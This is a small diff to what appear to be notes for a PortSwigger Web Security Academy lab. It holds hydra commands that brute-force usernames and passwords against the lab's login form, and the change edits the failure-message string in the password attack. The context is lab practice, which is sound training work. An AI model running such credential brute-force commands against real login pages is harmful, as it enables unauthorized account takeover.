@@ -15,7 +15,7 @@ HYDRA try:
 For username:
 `hydra -L ./login-list.txt -p test -S -s 443 -f 0a6300400322b8da80c8a35e00000049.web-security-academy.net http-post-form "/login:username=^USER^&password=^PASS^:Invalid username"`
 For password:
-`hydra -l access -P ./password-list.txt -t 64 -S -s 443 -f 0a6300400322b8da80c8a35e00000049.web-security-academy.net http-post-form "/login:username=^USER^&password=^PASS^:Invalid password"`
+`hydra -l access -P ./password-list.txt -t 64 -S -s 443 -f 0a6300400322b8da80c8a35e00000049.web-security-academy.net http-post-form "/login:username=^USER^&password=^PASS^:Incorrect password"`
 
 
 
